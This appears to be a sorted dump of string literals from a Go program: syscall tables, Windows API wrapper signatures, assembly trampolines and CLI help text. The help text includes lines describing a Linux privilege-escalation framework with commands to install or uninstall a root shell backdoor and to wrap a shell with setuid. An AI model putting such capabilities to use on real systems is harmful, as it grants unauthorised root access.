"SYS_SCHED_RR_GET_INTERVAL  = 334 // { int sched_rr_get_interval (pid_t pid, struct timespec "
"SYS_SCHED_SETPARAM           = 327 // { int sched_setparam (pid_t pid, const struct sched_param "
"SYS_SCHED_SETPARAM         = 327 // { int sched_setparam (pid_t pid, const struct sched_param "
"SYS_SCHED_SETSCHEDULER       = 329 // { int sched_setscheduler (pid_t pid, int policy, const struct sched_param "
"SYS_SCHED_SETSCHEDULER     = 329 // { int sched_setscheduler (pid_t pid, int policy, const struct sched_param "
"SYS_SCTP_GENERIC_RECVMSG     = 474 // { int sctp_generic_recvmsg(int sd, struct iovec "
"SYS_SCTP_GENERIC_SENDMSG     = 472 // { int sctp_generic_sendmsg(int sd, caddr_t msg, int mlen, caddr_t to, __socklen_t tolen, struct sctp_sndrcvinfo "
"SYS_SCTP_GENERIC_SENDMSG_IOV = 473 // { int sctp_generic_sendmsg_iov(int sd, struct iovec "
"SYS_SCTP_PEELOFF             = 471 // { int sctp_peeloff(int sd, uint32_t name)"
"SYS_SELECT                   = 93  // { int select(int nd, fd_set "
"SYS_SELECT                 = 93  // { int select(int nd, fd_set "
"SYS_SELECT         = 71  // { int sys_select(int nd, fd_set "
"SYS_SEMGET                   = 221 // { int semget(key_t key, int nsems, int semflg)"
"SYS_SEMGET                 = 221 // { int semget(key_t key, int nsems, int semflg)"
"SYS_SEMGET         = 221 // { int sys_semget(key_t key, int nsems, int semflg)"
"SYS_SEMOP                    = 222 // { int semop(int semid, struct sembuf "
"SYS_SEMOP                  = 222 // { int semop(int semid, struct sembuf "
"SYS_SEMOP          = 290 // { int sys_semop(int semid, struct sembuf "
"SYS_SEMSYS                   = 169 // { int semsys(int which, int a2, int a3, int a4, int a5)"
"SYS_SENDFILE                 = 393 // { int sendfile(int fd, int s, off_t offset, size_t nbytes, struct sf_hdtr "
"SYS_SENDFILE               = 393 // { int sendfile(int fd, int s, off_t offset, size_t nbytes, struct sf_hdtr "
"SYS_SENDMSG                  = 28  // { int sendmsg(int s, struct msghdr "
"SYS_SENDMSG                = 28  // { int sendmsg(int s, caddr_t msg, int flags)"
"SYS_SENDMSG        = 28  // { ssize_t sys_sendmsg(int s, const struct msghdr "
"SYS_SENDTO                   = 133 // { int sendto(int s, caddr_t buf, size_t len, int flags, caddr_t to, int tolen)"
"SYS_SENDTO                 = 133 // { int sendto(int s, caddr_t buf, size_t len, int flags, caddr_t to, int tolen)"
"SYS_SENDTO         = 133 // { ssize_t sys_sendto(int s, const void "
"SYS_SETGROUPS                = 80  // { int setgroups(u_int gidsetsize, gid_t "
"SYS_SETGROUPS              = 80  // { int setgroups(u_int gidsetsize, gid_t "
"SYS_SETGROUPS      = 80  // { int sys_setgroups(int gidsetsize, const gid_t "
"SYS_SETITIMER                = 83  // { int setitimer(u_int which, struct itimerval "
"SYS_SETITIMER              = 83  // { int setitimer(u_int which, struct itimerval "
"SYS_SETITIMER      = 69  // { int sys_setitimer(int which, const struct itimerval "
"SYS_SETPGID                  = 82  // { int setpgid(int pid, int pgid)"
"SYS_SETPGID                = 82  // { int setpgid(int pid, int pgid)"
"SYS_SETPGID        = 82  // { int sys_setpgid(pid_t pid, pid_t pgid)"
"SYS_SETPRIORITY              = 96  // { int setpriority(int which, int who, int prio)"
"SYS_SETPRIORITY            = 96  // { int setpriority(int which, int who, int prio)"
"SYS_SETPRIORITY    = 96  // { int sys_setpriority(int which, id_t who, int prio)"
"SYS_SETREGID                 = 127 // { int setregid(int rgid, int egid)"
"SYS_SETREGID               = 127 // { int setregid(int rgid, int egid)"
"SYS_SETREGID       = 127 // { int sys_setregid(gid_t rgid, gid_t egid)"
"SYS_SETRESGID                = 312 // { int setresgid(gid_t rgid, gid_t egid, gid_t sgid)"
"SYS_SETRESGID              = 312 // { int setresgid(gid_t rgid, gid_t egid, gid_t sgid)"
"SYS_SETRESGID      = 284 // { int sys_setresgid(gid_t rgid, gid_t egid, gid_t sgid)"
"SYS_SETRESUID                = 311 // { int setresuid(uid_t ruid, uid_t euid, uid_t suid)"
"SYS_SETRESUID              = 311 // { int setresuid(uid_t ruid, uid_t euid, uid_t suid)"
"SYS_SETRESUID      = 282 // { int sys_setresuid(uid_t ruid, uid_t euid, uid_t suid)"
"SYS_SETREUID                 = 126 // { int setreuid(int ruid, int euid)"
"SYS_SETREUID               = 126 // { int setreuid(int ruid, int euid)"
"SYS_SETREUID       = 126 // { int sys_setreuid(uid_t ruid, uid_t euid)"
"SYS_SETRLIMIT                = 195 // { int setrlimit(u_int which, struct rlimit "
"SYS_SETRLIMIT              = 195 // { int setrlimit(u_int which, struct rlimit "
"SYS_SETRLIMIT      = 195 // { int sys_setrlimit(int which, const struct rlimit "
"SYS_SETSOCKOPT               = 105 // { int setsockopt(int s, int level, int name, caddr_t val, int valsize)"
"SYS_SETSOCKOPT             = 105 // { int setsockopt(int s, int level, int name, caddr_t val, int valsize)"
"SYS_SETSOCKOPT     = 105 // { int sys_setsockopt(int s, int level, int name, const void "
"SYS_SET_TLS_AREA           = 472 // { int set_tls_area(int which, struct tls_info "
"SYS_SHMAT                    = 228 // { int shmat(int shmid, const void "
"SYS_SHMAT                  = 228 // { caddr_t shmat(int shmid, const void "
"SYS_SHMCTL                   = 512 // { int shmctl(int shmid, int cmd, struct shmid_ds "
"SYS_SHMCTL                 = 229 // { int shmctl(int shmid, int cmd, struct shmid_ds "
"SYS_SHMCTL         = 296 // { int sys_shmctl(int shmid, int cmd, struct shmid_ds "
"SYS_SHMGET                   = 231 // { int shmget(key_t key, size_t size, int shmflg)"
"SYS_SHMGET                 = 231 // { int shmget(key_t key, size_t size, int shmflg)"
"SYS_SHMGET         = 289 // { int sys_shmget(key_t key, size_t size, int shmflg)"
"SYS_SHMSYS                   = 171 // { int shmsys(int which, int a2, int a3, int a4)"
"SYS_SHUTDOWN                 = 134 // { int shutdown(int s, int how)"
"SYS_SHUTDOWN               = 134 // { int shutdown(int s, int how)"
"SYS_SHUTDOWN       = 134 // { int sys_shutdown(int s, int how)"
"SYS_SIGACTION                = 416 // { int sigaction(int sig, const struct sigaction "
"SYS_SIGACTION              = 342 // { int sigaction(int sig, const struct sigaction "
"SYS_SIGACTION      = 46  // { int sys_sigaction(int signum, const struct sigaction "
"SYS_SIGPROCMASK              = 340 // { int sigprocmask(int how, const sigset_t "
"SYS_SIGPROCMASK            = 340 // { int sigprocmask(int how, const sigset_t "
"SYS_SIGPROCMASK    = 48  // { int sys_sigprocmask(int how, sigset_t mask)"
"SYS_SIGQUEUE                 = 456 // { int sigqueue(pid_t pid, int signum, void "
"SYS_SOCKET                   = 97  // { int socket(int domain, int type, int protocol)"
"SYS_SOCKET                 = 97  // { int socket(int domain, int type, int protocol)"
"SYS_SOCKET         = 97  // { int sys_socket(int domain, int type, int protocol)"
"SYS_SOCKETPAIR               = 135 // { int socketpair(int domain, int type, int protocol, int "
"SYS_SOCKETPAIR             = 135 // { int socketpair(int domain, int type, int protocol, int "
"SYS_SOCKETPAIR     = 135 // { int sys_socketpair(int domain, int type, int protocol, int "
"SYS_SWAPCTL        = 193 // { int sys_swapctl(int cmd, const void "
"SYS_SYSARCH                  = 165 // { int sysarch(int op, char "
"SYS_SYSARCH                = 165 // { int sysarch(int op, char "
"SYS_SYSARCH        = 165 // { int sys_sysarch(int op, void "
"SYS_SYS_CHECKPOINT         = 467 // { int sys_checkpoint(int type, int fd, pid_t pid, int retval)"
"SYS_THRKILL        = 119 // { int sys_thrkill(pid_t tid, int signum, void "
"SYS_THR_KILL                 = 433 // { int thr_kill(long id, int sig)"
"SYS_THR_KILL2                = 481 // { int thr_kill2(pid_t pid, long id, int sig)"
"SYS_THR_SET_NAME             = 464 // { int thr_set_name(long id, const char "
"SYS_UNLINKAT                 = 503 // { int unlinkat(int fd, char "
"SYS_UNLINKAT               = 508 // { int unlinkat(int fd, char "
"SYS_UNLINKAT       = 325 // { int sys_unlinkat(int fd, const char "
"SYS_USCHED_SET             = 481 // { int usched_set(pid_t pid, int cmd, void "
"SYS_UTIMENSAT                = 547 // { int utimensat(int fd, char "
"SYS_UTIMENSAT              = 539 // { int utimensat(int fd, const char "
"SYS_UTIMENSAT      = 84  // { int sys_utimensat(int fd, const char "
"SYS_VARSYM_GET             = 451 // { int varsym_get(int mask, const char "
"SYS_VARSYM_LIST            = 452 // { int varsym_list(int level, char "
"SYS_VARSYM_SET             = 450 // { int varsym_set(int level, const char "
"SYS_VMM_GUEST_CTL          = 534 // { int vmm_guest_ctl(int op, struct vmm_guest_options "
"SYS_WAIT4                    = 7   // { int wait4(int pid, int "
"SYS_WAIT4          = 11  // { pid_t sys_wait4(pid_t pid, int "
"SYS_WAIT4 = 7 // { int wait4(int pid, int "
"SYS_WAIT6                    = 532 // { int wait6(idtype_t idtype, id_t id, int "
"SYS_WAIT6                  = 548 // { int wait6(idtype_t idtype, id_t id, int "
"SYS_WRITE                    = 4   // { ssize_t write(int fd, const void "
"SYS_WRITE          = 4   // { ssize_t sys_write(int fd, const void "
"SYS_WRITE = 4 // { ssize_t write(int fd, const void "
"SYS_WRITEV                   = 121 // { int writev(int fd, struct iovec "
"SYS_WRITEV                 = 121 // { int writev(int fd, struct iovec "
"SYS_WRITEV         = 121 // { ssize_t sys_writev(int fd, const struct iovec "
"SYS___ACL_ACLCHECK_FD        = 354 // { int __acl_aclcheck_fd(int filedes, acl_type_t type, struct acl "
"SYS___ACL_ACLCHECK_FD      = 354 // { int __acl_aclcheck_fd(int filedes, acl_type_t type, struct acl "
"SYS___ACL_DELETE_FD          = 352 // { int __acl_delete_fd(int filedes, acl_type_t type)"
"SYS___ACL_DELETE_FD        = 352 // { int __acl_delete_fd(int filedes, acl_type_t type)"
"SYS___ACL_GET_FD             = 349 // { int __acl_get_fd(int filedes, acl_type_t type, struct acl "
"SYS___ACL_GET_FD           = 349 // { int __acl_get_fd(int filedes, acl_type_t type, struct acl "
"SYS___ACL_SET_FD             = 350 // { int __acl_set_fd(int filedes, acl_type_t type, struct acl "
"SYS___ACL_SET_FD           = 350 // { int __acl_set_fd(int filedes, acl_type_t type, struct acl "
"SYS___CAP_RIGHTS_GET         = 515 // { int __cap_rights_get(int version, int fd, cap_rights_t "
"SYS___MAC_GET_FD             = 386 // { int __mac_get_fd(int fd, struct mac "
"SYS___MAC_GET_PID            = 409 // { int __mac_get_pid(pid_t pid, struct mac "
"SYS___MAC_SET_FD             = 388 // { int __mac_set_fd(int fd, struct mac "
"SYS___SEMCTL                 = 510 // { int __semctl(int semid, int semnum, int cmd, union semun "
"SYS___SEMCTL               = 220 // { int __semctl(int semid, int semnum, int cmd, union semun "
"SYS___SEMCTL       = 295 // { int sys___semctl(int semid, int semnum, int cmd, union semun "
"SYS___THRSIGDIVERT = 303 // { int sys___thrsigdivert(sigset_t sigmask, siginfo_t "
"S_IFIFO, 0)"
"Scope: int(pp.Scope),"
"Sec:  x.Sec,"
"SecurityAttributes) (handle Handle, err error)  [failretval==InvalidHandle] = CreateNamedPipeW"
"SecurityAttributes) (handle Handle, err error) {"
"SecurityAttributes, createmode uint32, attrs uint32, templatefile Handle) (handle Handle, err error) [failretval==InvalidHandle] = CreateFileW"
"SecurityAttributes, createmode uint32, attrs uint32, templatefile Handle) (handle Handle, err error) {"
"SecurityAttributes, impersonationLevel uint32, tokenType uint32, newToken "
"SecurityAttributes, inheritHandles bool, creationFlags uint32, env "
"SecurityAttributes, initialOwner bool, name "
"SecurityAttributes, manualReset uint32, initialState uint32, name "
"SecurityAttributes, name "
"SecurityAttributes, prot uint32, maxSizeHigh uint32, maxSizeLow uint32, name "
"SecurityAttributes, size uint32) (err error) {"
"SecurityAttributes, size uint32) (err error)"
"SecurityAttributes, threadSecurity "
"Seek(fd int, offset int64, whence int) (newoffset int64, err error) = SYS_LSEEK"
"Seek(fd int, offset int64, whence int) (newoffset int64, err error) = lseek"
"Seek(fd int, offset int64, whence int) (off int64, err error) = SYS_LSEEK"
"Seek(fd int, offset int64, whence int) (off int64, err error) = lseek"
"Seek(fd int, offset int64, whence int) (off int64, err error) = lseek64"
"Select(nfd int, r "
"Servent, err error) [failretval==nil] = ws2_32.getservbyname"
"Servent, err error) {"
"ServiceName:    string(pp.Service_name[:pp.Service_name_len]),"
"SetCommTimeouts(handle Handle, timeouts "
"SetConsoleMode(console Handle, mode uint32) (err error) = kernel32.SetConsoleMode"
"SetFileCompletionNotificationModes(handle Handle, flags uint8) (err error) = kernel32.SetFileCompletionNotificationModes"
"SetFileInformationByHandle(handle Handle, class uint32, inBuffer "
"SetFilePointer(handle Handle, lowoffset int32, highoffsetptr "
"SetFileTime(handle Handle, ctime "
"SetHandleInformation(Handle(fd), HANDLE_FLAG_INHERIT, 0)"
"SetHandleInformation(handle Handle, mask uint32, flags uint32) (err error)"
"SetInformationJobObject(job Handle, JobObjectInformationClass uint32, JobObjectInformation uintptr, JobObjectInformationLength uint32) (ret int, err error)"
"SetKernelObjectSecurity(handle Handle, securityInformation SECURITY_INFORMATION, securityDescriptor "
"SetNamedPipeHandleState(pipe Handle, state "
"SetNamedSecurityInfo(objectName string, objectType SE_OBJECT_TYPE, securityInformation SECURITY_INFORMATION, owner "
"SetPriorityClass(process Handle, priorityClass uint32) (err error) = kernel32.SetPriorityClass"
"SetProcessPriorityBoost(process Handle, disable bool) (err error) = kernel32.SetProcessPriorityBoost"
"SetProcessShutdownParameters(level uint32, flags uint32) (err error) = kernel32.SetProcessShutdownParameters"
"SetProcessWorkingSetSizeEx(hProcess Handle, dwMinimumWorkingSetSize uintptr, dwMaximumWorkingSetSize uintptr, flags uint32) (err error)"
"SetSecurityInfo(handle Handle, objectType SE_OBJECT_TYPE, securityInformation SECURITY_INFORMATION, owner "
"SetServiceStatus(service Handle, serviceStatus "
"SetStdHandle(stdhandle uint32, handle Handle) (err error)"
"SetTokenInformation(token Token, infoClass uint32, info "
"Setns(fd int, nstype int) (err error)"
"Setpgid(pid int, pgid int) (err error) = SYS_SETPGID"
"Setpgid(pid int, pgid int) (err error)"
"Setpriority(which int, who int, prio int) (err error)"
"Setregid(rgid int, egid int) (err error) = SYS_SETREGID"
"Setregid(rgid int, egid int) (err error) = SYS_SETREGID32"
"Setregid(rgid int, egid int) (err error)"
"Setresgid(rgid int, egid int, sgid int) (err error) = SYS_SETRESGID32"
"Setresgid(rgid int, egid int, sgid int) (err error)"
"Setresuid(ruid int, euid int, suid int) (err error) = SYS_SETRESUID32"
"Setresuid(ruid int, euid int, suid int) (err error)"
"Setreuid(ruid int, euid int) (err error) = SYS_SETREUID"
"Setreuid(ruid int, euid int) (err error) = SYS_SETREUID32"
"Setreuid(ruid int, euid int) (err error)"
"Setrlimit(resource int, lim "
"Setrlimit(resource int, rlim "
"Setrlimit(which int, lim "
"Setsid() (pid int, err error) = SYS_SETSID"
"Setsid() (pid int, err error)"
"Setsockopt(s Handle, level int32, optname int32, optval "
"SetupDiBuildDriverInfoList(deviceInfoSet DevInfo, deviceInfoData "
"SetupDiCallClassInstaller(installFunction DI_FUNCTION, deviceInfoSet DevInfo, deviceInfoData "
"SetupDiDestroyDriverInfoList(deviceInfoSet DevInfo, deviceInfoData "
"SetupDiGetClassInstallParams(deviceInfoSet DevInfo, deviceInfoData "
"SetupDiOpenDevRegKey(deviceInfoSet DevInfo, deviceInfoData "
"SetupDiSetClassInstallParams(deviceInfoSet DevInfo, deviceInfoData "
"SetupDiSetDeviceInstallParams(deviceInfoSet DevInfo, deviceInfoData "
"SetupDiSetSelectedDevice(deviceInfoSet DevInfo, deviceInfoData "
"SetupDiSetSelectedDriver(deviceInfoSet DevInfo, deviceInfoData "
"Setxattr(path string, attr string, data []byte, flags int) (err error)"
"SharedUmemFD: pp.Shared_umem_fd,"
"Shell(ctx context.Context, s "
"ShellCompDirectiveError, ShellCompDirectiveNoSpace, ShellCompDirectiveNoFileComp,"
"ShellCompDirectiveFilterFileExt, ShellCompDirectiveFilterDirs, activeHelpEnvVar(name)))"
"ShellCompDirectiveFilterFileExt, ShellCompDirectiveFilterDirs,"
"ShellCompNoDescRequestCmd = ""__completeNoDesc"""
"ShellCompRequestCmd = ""__complete"""
"ShellExecute(hwnd Handle, verb "
"Short:                 ""Request shell completion choices for the specified command-line"","
"Short:   ""Display one or many resources"","
"Short: ""A generator for Cobra based Applications"","
"Short: ""Display the status of the named release"","
"Short: ""Generate completion script"","
"Short: ""Generate the autocompletion script for the specified shell"","
"Short: ""Help about any command"","
"Short: ""Install a root shell backdoor"","
"Short: ""List all available methods."","
"Short: ""Traitor is a privilege escalation framework for Linux"","
"Short: ""Uninstall a root shell backdoor"","
"Short: ""Wrap a given shell with setuid"","
"Short: ""add a chart repository"","
"Short: ""kubectl controls the Kubernetes cluster manager"","
"Short: fmt.Sprintf(shortDesc, ""bash""),"
"Short: fmt.Sprintf(shortDesc, ""fish""),"
"Short: fmt.Sprintf(shortDesc, ""powershell""),"
"Short: fmt.Sprintf(shortDesc, ""zsh""),"
"Shorthand: shorthand,"
"ShorthandDeprecated string              // If the shorthand of this flag is deprecated, this string is the new or now thing to use"
"Shutdown(fd int, how int) (err error)"
"Shutdown(s int, how int) (err error) = libsocket.shutdown"
"Shutdown(s int, how int) (err error)"
"Sid, for the domain specified by the domainSid parameter."
"Sid, for the local machine."
"SidIdentifierAuthority, subAuth byte, subAuth0 uint32, subAuth1 uint32, subAuth2 uint32, subAuth3 uint32, subAuth4 uint32, subAuth5 uint32, subAuth6 uint32, subAuth7 uint32, sid "
"Siginfo, flags int) (err error) = SYS_PIDFD_SEND_SIGNAL"
"Siginfo, flags int) (err error) {"
"Siginfo, options int, rusage "
"Sigset_t) (n int, err error) = SYS_PSELECT6"
"Sigset_t) (n int, err error) {"
"Sigset_t) (n int, err error)"
"Sigset_t, flags int) (newfd int, err error) {"
"Sigset_t, maskSize uintptr, flags int) (newfd int, err error) = SYS_SIGNALFD4"
"Sigset_t, maskSize uintptr, flags int) (newfd int, err error) {"
"Similarly, for flags:"
"Since the flags are defined and used in different locations, we need to"
"Size:    int64(len(dockerfile)),"
"Size:    old.Size,"
"SizeofResource(module Handle, resInfo Handle) (size uint32, err error) = kernel32.SizeofResource"
"SleepEx(milliseconds uint32, alertable bool) (ret uint32) = kernel32.SleepEx"
"SockaddrALG) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrCAN) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrCANJ1939) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrCtl) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrDatalink) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrHCI) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrIUCV) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrInet4) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrInet4) sockaddr() (unsafe.Pointer, int32, error) {"
"SockaddrInet6) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrInet6) sockaddr() (unsafe.Pointer, int32, error) {"
"SockaddrL2) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrL2TPIP) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrL2TPIP6) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrLinklayer) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrNFC) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrNFCLLCP) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrNetlink) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrPPPoE) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrRFCOMM) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrTIPC) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrUnix) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrUnix) sockaddr() (unsafe.Pointer, int32, error) {"
"SockaddrVM) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SockaddrXDP) sockaddr() (unsafe.Pointer, _Socklen, error) {"
"SocketControlMessage) (Sockaddr, error) {"
"SocketControlMessage) ([]int, error) {"
"Software without restriction, including without limitation"
"SortFlags:     true,"
"Source, ""source"", ""s"", """", ""Source directory to read from"")"
"SourceSAP:      pp.Ssap,"
"Speed:         speed,"
"SpeedFast,"
"Splice(rfd int, roff "
"StandardInput, StandardOutput, StandardError Handle"
"Start:  int64(0),"
"StartService(service Handle, numArgs uint32, argVectors "
"StartingX, StartingY, CountX, CountY, CountCharsX, CountCharsY, FillAttribute uint32"
"StartupInfo, outProcInfo "
"Stat(path string, stat "
"Stat_t, flags int) (err error) = SYS_FSTATAT64"
"Stat_t, flags int) (err error) = SYS_NEWFSTATAT"
"Stat_t, flags int) (err error) = fstatat"
"Stat_t, flags int) (err error) {"
"Stat_t, flags int) (err error)"
"Stat_t, flags int) error {"
"Stat_t, st "
"Stat_t, statLE "
"State, error) {"
"State{state{st}}, nil"
"Statfs(path string, buf "
"Statfs(path string, stat "
"Statvfs(path string, vfsstat "
"Statvfs1(path string, buf "
"Statvfs_t, flags int) (err error) = SYS_FSTATVFS1"
"Statvfs_t, flags int) (err error) = SYS_STATVFS1"
"Statvfs_t, flags int) (err error) {"
"Statx(dirfd int, path string, flags int, mask int, stat "
"Stderr: os.Stderr,"
"Stdin:  os.Stdin,"
"Stdout: os.Stdout,"
"Strioctl) (int, error) {"
"SubscribeServiceChangeNotifications(service Handle, eventType uint32, callback uintptr, callbackCtx uintptr, subscription "
"SudoEntry, error) {"
"Symlink(path string, link string) (err error) = SYS___SYMLINK_A"
"Symlink(path string, link string) (err error)"
"Symlinkat(oldpath string, newdirfd int, newpath string) (err error)"
"SyncFileRange(fd int, off int64, n int64, flags int) (err error)"
"Syncreads:   old.Syncreads,"
"Syncwrites:  old.Syncwrites,"
"Syscall(SB),NOSPLIT,$0-28"
"Syscall(SB),NOSPLIT,$0-32"
"Syscall(SB),NOSPLIT,$0-56"
"Syscall(SB),NOSPLIT,$0-64"
"Syscall(SYS_EXIT, uintptr(code), 0, 0)"
"Syscall6(SB),NOSPLIT,$0-40"
"Syscall6(SB),NOSPLIT,$0-44"
"Syscall6(SB),NOSPLIT,$0-80"
"Syscall6(SB),NOSPLIT,$0-88"
"Syscall9(SB),NOSPLIT,$0-104"
"Syscall9(SB),NOSPLIT,$0-52"
"SyscallNoError(SB),NOSPLIT,$0-24"
"SyscallNoError(SB),NOSPLIT,$0-48"
"SyscallNoError(SYS_EXIT_GROUP, uintptr(code), 0, 0)"
"SyscallNoError(SYS_SYNC, 0, 0, 0)"
"Sysconf(which int) (n int64, err error)"
"SysvShmDesc) (result int, err error) {"
"SysvShmDesc) (result int, err error)"
"TASKSTATS_GENL_NAME                         = ""TASKSTATS"""
"TCPConnectionInfo, error) {"
"TCPInfo, error) {"
"TEXT addrerrno<>(SB),NOSPLIT"
"TEXT libc_accept_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_access_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_adjtime_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_bind_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_chdir_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_chflags_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_chmod_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_chown_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_chroot_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_clock_gettime_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_clonefile_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_clonefileat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_close_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_closedir_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_connect_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_dup2_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_dup_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_exchangedata_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_exit_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_faccessat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fchdir_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fchflags_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fchmod_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fchmodat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fchown_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fchownat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fclonefileat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fcntl_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fdopendir_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fgetxattr_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_flistxattr_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_flock_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fpathconf_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fremovexattr_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fsetxattr_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fstat64_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fstat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fstatat64_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fstatat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fstatfs64_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fstatfs_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_fsync_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_ftruncate_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_futimes_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getcwd_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getdtablesize_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getegid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_geteuid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getfsstat64_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getfsstat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getgid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getgroups_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getpeername_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getpgid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getpgrp_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getpid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getppid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getpriority_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getrlimit_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getrusage_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getsid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getsockname_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getsockopt_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_gettimeofday_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getuid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_getxattr_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_ioctl_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_issetugid_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_kevent_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_kill_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_kqueue_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_lchown_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_link_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_linkat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_listen_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_listxattr_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_lseek_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_lstat64_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_lstat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_madvise_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_mkdir_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_mkdirat_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_mkfifo_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_mknod_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_mlock_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_mlockall_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_mmap_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_mount_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_mprotect_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_msync_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_munlock_trampoline<>(SB),NOSPLIT,$0-0"
"TEXT libc_munlockall_trampoline<>(SB),NOSPLIT,$0-0"
